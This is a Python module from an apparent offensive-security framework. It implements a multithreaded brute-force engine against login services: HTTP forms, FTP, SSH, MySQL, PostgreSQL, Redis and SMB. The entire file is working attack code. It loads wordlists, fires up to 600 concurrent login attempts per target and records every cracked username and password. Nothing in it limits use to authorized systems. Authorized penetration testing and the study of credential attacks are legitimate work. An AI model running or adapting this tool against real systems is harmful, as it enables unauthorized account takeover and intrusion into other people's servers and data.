#!/usr/bin/env python3
"""
Brute Force Engine – Multi-protocol credential testing
Oxysintx Framework

Location: modules/brute_force.py
"""

import logging
import threading
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import List, Dict, Optional

import ftplib
import paramiko
import mysql.connector
import psycopg2
import redis
import http.client
import urllib.parse

logger = logging.getLogger(__name__)

DATA_DIR = Path(__file__).parent.parent / "brute-force-text"
MAX_THREADS = 600
DEFAULT_TIMEOUT = 3.0
BRUTE_FORCE_TIMEOUT = 2.0

class BruteForceAttack:
    def __init__(self, max_workers=MAX_THREADS):
        self.max_workers = max_workers
        self.results = []
        self._lock = threading.Lock()
        self._stop_flag = False

    def stop(self):
        self._stop_flag = True

    def load_wordlist(self, file_pattern="data1.txt", max_files=10) -> List[str]:
        wordlist = []
        base, ext = file_pattern.rsplit('.', 1) if '.' in file_pattern else (file_pattern, 'txt')
        for i in range(1, max_files + 1):
            filename = f"{base}{i}.{ext}" if i > 1 else file_pattern
            filepath = DATA_DIR / filename
            if not filepath.exists():
                logger.info(f"File {filename} not found, stopping")
                break
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            wordlist.append(line)
                logger.info(f"Loaded {len(wordlist)} entries from {filename}")
            except Exception as e:
                logger.error(f"Error loading {filename}: {e}")
                break
        return wordlist

    # HTTP
    def brute_http_login(self, target, port, username_list, password_list, login_url="/login",
                         method="POST", username_field="username", password_field="password"):
        results = []
        def attempt(u, p):
            if self._stop_flag: return None
            try:
                conn = http.client.HTTPConnection(target, port, timeout=BRUTE_FORCE_TIMEOUT)
                payload = f"{username_field}={urllib.parse.quote(u)}&{password_field}={urllib.parse.quote(p)}"
                headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
                conn.request(method, login_url, payload, headers)
                resp = conn.getresponse()
                data = resp.read().decode('utf-8', errors='ignore')
                conn.close()
                if resp.status == 302 or 'dashboard' in data.lower() or 'welcome' in data.lower():
                    return {'username': u, 'password': p, 'status': 'success'}
            except Exception as e:
                logger.debug(f"HTTP brute error: {e}")
            return None

        with ThreadPoolExecutor(max_workers=min(self.max_workers, len(username_list)*len(password_list))) as ex:
            futures = [ex.submit(attempt, u, p) for u in username_list for p in password_list]
            for fut in as_completed(futures):
                if self._stop_flag: break
                res = fut.result()
                if res:
                    results.append(res)
                    with self._lock:
                        self.results.append({'type':'http_login','target':target,'port':port,'username':res['username'],'password':res['password']})
        return results

    # FTP
    def brute_ftp_login(self, target, username_list, password_list, port=21):
        results = []
        def attempt(u, p):
            if self._stop_flag: return None
            try:
                ftp = ftplib.FTP()
                ftp.connect(target, port, timeout=BRUTE_FORCE_TIMEOUT)
                ftp.login(u, p)
                ftp.quit()
                return {'username': u, 'password': p, 'status': 'success'}
            except ftplib.all_errors:
                return None
        with ThreadPoolExecutor(max_workers=min(self.max_workers, len(username_list)*len(password_list))) as ex:
            futures = [ex.submit(attempt, u, p) for u in username_list for p in password_list]
            for fut in as_completed(futures):
                if self._stop_flag: break
                res = fut.result()
                if res:
                    results.append(res)
                    with self._lock:
                        self.results.append({'type':'ftp_login','target':target,'port':port,'username':res['username'],'password':res['password']})
        return results

    # SSH
    def brute_ssh_login(self, target, username_list, password_list, port=22):
        results = []
        def attempt(u, p):
            if self._stop_flag: return None
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(target, port=port, username=u, password=p, timeout=BRUTE_FORCE_TIMEOUT,
                                allow_agent=False, look_for_keys=False)
                client.close()
                return {'username': u, 'password': p, 'status': 'success'}
            except (paramiko.AuthenticationException, socket.error, paramiko.SSHException):
                return None
        with ThreadPoolExecutor(max_workers=min(self.max_workers, len(username_list)*len(password_list))) as ex:
            futures = [ex.submit(attempt, u, p) for u in username_list for p in password_list]
            for fut in as_completed(futures):
                if self._stop_flag: break
                res = fut.result()
                if res:
                    results.append(res)
                    with self._lock:
                        self.results.append({'type':'ssh_login','target':target,'port':port,'username':res['username'],'password':res['password']})
        return results

    # MySQL
    def brute_mysql_login(self, target, username_list, password_list, port=3306):
        results = []
        def attempt(u, p):
            if self._stop_flag: return None
            try:
                conn = mysql.connector.connect(host=target, port=port, user=u, password=p, connection_timeout=BRUTE_FORCE_TIMEOUT)
                conn.close()
                return {'username': u, 'password': p, 'status': 'success'}
            except (mysql.connector.errors.ProgrammingError, mysql.connector.errors.InterfaceError):
                return None
        with ThreadPoolExecutor(max_workers=min(self.max_workers, len(username_list)*len(password_list))) as ex:
            futures = [ex.submit(attempt, u, p) for u in username_list for p in password_list]
            for fut in as_completed(futures):
                if self._stop_flag: break
                res = fut.result()
                if res:
                    results.append(res)
                    with self._lock:
                        self.results.append({'type':'mysql_login','target':target,'port':port,'username':res['username'],'password':res['password']})
        return results

    # PostgreSQL
    def brute_postgresql_login(self, target, username_list, password_list, port=5432):
        results = []
        def attempt(u, p):
            if self._stop_flag: return None
            try:
                conn = psycopg2.connect(host=target, port=port, user=u, password=p, connect_timeout=BRUTE_FORCE_TIMEOUT)
                conn.close()
                return {'username': u, 'password': p, 'status': 'success'}
            except (psycopg2.OperationalError, psycopg2.ProgrammingError):
                return None
        with ThreadPoolExecutor(max_workers=min(self.max_workers, len(username_list)*len(password_list))) as ex:
            futures = [ex.submit(attempt, u, p) for u in username_list for p in password_list]
            for fut in as_completed(futures):
                if self._stop_flag: break
                res = fut.result()
                if res:
                    results.append(res)
                    with self._lock:
                        self.results.append({'type':'postgresql_login','target':target,'port':port,'username':res['username'],'password':res['password']})
        return results

    # Redis
    def brute_redis_login(self, target, password_list, port=6379):
        results = []
        def attempt(p):
            if self._stop_flag: return None
            try:
                client = redis.Redis(host=target, port=port, password=p, socket_timeout=BRUTE_FORCE_TIMEOUT)
                client.ping()
                return p
            except (redis.AuthenticationError, redis.ConnectionError):
                return None
        with ThreadPoolExecutor(max_workers=min(self.max_workers, len(password_list))) as ex:
            futures = [ex.submit(attempt, p) for p in password_list]
            for fut in as_completed(futures):
                if self._stop_flag: break
                res = fut.result()
                if res:
                    results.append({'password': res})
                    with self._lock:
                        self.results.append({'type':'redis_login','target':target,'port':port,'password':res})
        return results

    # SMB
    def brute_smb_login(self, target, username_list, password_list):
        results = []
        def attempt(u, p):
            if self._stop_flag: return None
            try:
                import smbclient
                smbclient.register_session(target, username=u, password=p)
                return {'username': u, 'password': p, 'status': 'success'}
            except Exception:
                return None
        with ThreadPoolExecutor(max_workers=min(self.max_workers, len(username_list)*len(password_list))) as ex:
            futures = [ex.submit(attempt, u, p) for u in username_list for p in password_list]
            for fut in as_completed(futures):
                if self._stop_flag: break
                res = fut.result()
                if res:
                    results.append(res)
                    with self._lock:
                        self.results.append({'type':'smb_login','target':target,'username':res['username'],'password':res['password']})
        return results

    def run_full_attack(self, target, protocols=None, username_file="data1.txt", password_file="data1.txt"):
        protocols = protocols or ['http','ftp','ssh']
        usernames = self.load_wordlist(username_file)
        passwords = self.load_wordlist(password_file)
        if not usernames or not passwords:
            return {'error': 'Wordlist empty'}
        attack_results = {'target': target, 'protocols_tested': protocols, 'results': {}}
        port_map = {'http':80,'https':443,'ftp':21,'ssh':22,'mysql':3306,'postgresql':5432,'redis':6379,'smb':445,'rdp':3389,'telnet':23}
        for proto in protocols:
            if self._stop_flag: break
            port = port_map.get(proto, 80)
            if proto == 'http':
                res = self.brute_http_login(target, port, usernames[:20], passwords[:20])
            elif proto == 'ftp':
                res = self.brute_ftp_login(target, usernames[:20], passwords[:20])
            elif proto == 'ssh':
                res = self.brute_ssh_login(target, usernames[:20], passwords[:20])
            elif proto == 'mysql':
                res = self.brute_mysql_login(target, usernames[:20], passwords[:20])
            elif proto == 'postgresql':
                res = self.brute_postgresql_login(target, usernames[:20], passwords[:20])
            elif proto == 'redis':
                res = self.brute_redis_login(target, passwords[:20])
            elif proto == 'smb':
                res = self.brute_smb_login(target, usernames[:20], passwords[:20])
            else:
                res = []
            attack_results['results'][proto] = {'successful': len(res), 'credentials': res}
        attack_results['total_successful'] = sum(len(r['credentials']) for r in attack_results['results'].values())
        return attack_results